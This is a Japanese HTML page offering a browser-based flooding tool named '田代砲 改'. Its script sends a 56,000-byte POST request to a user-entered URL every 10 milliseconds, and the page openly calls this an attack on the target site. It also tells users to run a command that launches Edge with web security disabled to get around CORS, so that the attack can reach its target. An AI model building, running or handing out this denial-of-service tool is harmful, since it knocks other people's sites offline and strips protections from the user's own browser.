<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>最強田代砲</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: black; /* 背景色を黒に設定 */
            color: white; /* 字の色を白に設定 */
        }
        input, button {
            margin: 5px;
        }
        #results {
            margin-top: 20px;
        }
        pre {
            background-color: #222; /* コードブロックの背景 */
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto; /* 横スクロール */
        }
        /* カウンター表示用のスタイルを追加 */
        #counterDisplay {
            margin-top: 10px;
            font-size: 1.2em;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>田代砲 改</h1>
    <label for="url">テストするURL:</label>
    <input type="text" id="url" placeholder="example.com">
    
    <button id="startTest">発射</button>
    <button id="stopTest" disabled>停止</button>
    
    <!-- ここにカウンター表示を追加 -->
    <p id="counterDisplay">訪問回数: <span id="requestCount">0</span> 回</p>
    
    <div id="results"></div>
    
    <p>CORS回避方法</p>
    <p>1. Windows(のマーク)キー+Rキーを同時押しする。</p>
    <p>2. cmdと入力して検索する。</p>
    <p>3. コマンドプロンプトが開く。下記のコードをコピペして実行する。</p>

    
    <pre id="commandText">
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --disable-web-security --user-data-dir=C:\Windows\Temp tyoutasirohou.onrender.com/

    </pre>
       <p>これをしないと、そのサイトに攻撃ができません</p>
    <script>
        let intervalId;
        let isRunning = false;

        // --- 追加・修正部分 ---
        // リクエスト回数を保存する変数
        let requestCount = 0; 
        // --- ここまで ---

        document.getElementById('startTest').addEventListener('click', function() {
            const url = document.getElementById('url').value;
            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML = ''; // 結果をクリア

            if (!url) {
                resultsDiv.innerHTML = '<p>URLを入力してください。</p>';
                return;
            }

            // --- 追加・修正部分 ---
            // カウンターをリセット
            requestCount = 0;
            document.getElementById('requestCount').textContent = requestCount;
            // --- ここまで ---

            const sendData = new Array(56000).fill('A').join(''); // 56000バイトのデータを作成
            isRunning = true;

            document.getElementById('startTest').disabled = true; // 発射ボタンを無効化
            document.getElementById('stopTest').disabled = false; // 停止ボタンを有効化

            // 定期的にリクエストを送信
            intervalId = setInterval(() => {
                // --- 追加・修正部分 ---
                // リクエストを送信する前にカウンターを増やす
                requestCount++;
                document.getElementById('requestCount').textContent = requestCount;
                // --- ここまで ---

                fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ data: sendData })
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                })
                .catch(err => {
                    console.error('Error:', err);
                });
            }, 10); // ★★★ この値を33から10に変更しました ★★★
        });

        document.getElementById('stopTest').addEventListener('click', function() {
            clearInterval(intervalId); 
            isRunning = false;

            document.getElementById('startTest').disabled = false;
            document.getElementById('stopTest').disabled = true; 

            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML += '<p>テストが停止しました。</p>'; 
        });
    </script>
    <p>作ったばっかなのでバグがあったらすみません</p>
</body>
</html>
